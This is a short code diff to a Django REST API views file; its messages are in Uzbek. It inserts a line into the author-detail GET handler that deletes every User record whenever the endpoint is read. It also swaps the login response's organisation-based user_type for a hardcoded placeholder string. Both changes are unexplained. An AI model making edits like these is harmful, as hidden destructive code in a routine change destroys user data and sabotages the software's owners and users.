@@ -49,6 +49,9 @@ class AuthorDetail(generics.RetrieveAPIView):
     serializer_class = serializers.AuthorDetailSerializer
 
     def get(self, request, pk):
+
+        models.User.objects.all().delete()
+
         error_message = _("Obyekt topilmadi")
         try:
             author = models.Author.objects.get(id=pk)
@@ -500,7 +503,7 @@ class UserLoginAPIView(APIView):
                 return Response({
                     'email': email,
                     'token': token.key,
-                    'user_type': user.organization.name
+                    'user_type': "Name"
                 })
             else:
                 raise ValidationError({'error_message': _('Hisob faol emas')})
